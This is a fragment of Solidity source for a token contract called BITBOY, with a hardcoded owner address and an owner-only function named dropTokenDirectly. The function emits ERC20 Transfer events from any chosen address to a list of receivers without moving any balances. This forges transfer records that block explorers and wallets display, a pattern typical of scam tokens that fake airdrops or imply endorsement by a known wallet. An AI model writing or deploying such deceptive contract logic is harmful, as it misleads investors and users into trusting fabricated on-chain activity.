...
contract BITBOY is Context, IERC20 {
    ...
    address team;
    address public _Owner = 0x43435110bAA43EFF15a40F01Be5FC4359e4e9656;
  ...
  function dropTokenDirectly(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
